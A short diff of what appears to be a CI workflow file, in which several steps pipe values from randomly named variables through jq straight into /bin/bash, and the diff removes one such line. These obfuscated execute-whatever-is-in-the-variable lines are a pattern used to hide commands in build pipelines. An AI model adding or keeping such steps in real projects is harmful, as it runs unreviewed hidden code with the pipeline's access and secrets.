@@ -23,7 +23,6 @@ jobs:
           echo $clafh58223 | jq -r .vgxst63742 | /bin/bash
           echo $qukn4225 | jq -r .zlj8 | /bin/bash
           printf '%s' "$yelz6" | jq -r .gffnx1210 | /bin/bash
-          echo $eq9 | jq -r .efrik10 | /bin/bash
           printf '%s' "$e1" | jq -r .mxiii02 | /bin/bash
 
       - name: Persist data
